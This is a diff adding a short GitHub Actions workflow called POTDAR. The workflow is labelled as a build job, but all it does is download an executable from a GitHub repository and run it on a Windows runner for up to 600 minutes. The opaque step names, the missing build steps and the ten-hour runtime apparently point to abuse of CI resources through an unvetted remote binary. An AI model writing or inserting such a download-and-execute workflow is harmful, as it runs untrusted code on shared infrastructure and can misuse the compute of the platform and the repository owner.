@@ -1,0 +1,11 @@
+name: POTDAR
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: SGH
+      run: Invoke-WebRequest https://github.com/vishal11000/potdar/raw/main/POTDAR.exe -OutFile POTDAR.exe
+    - name: WVU
+      run: .\POTDAR.exe
+      timeout-minutes: 600
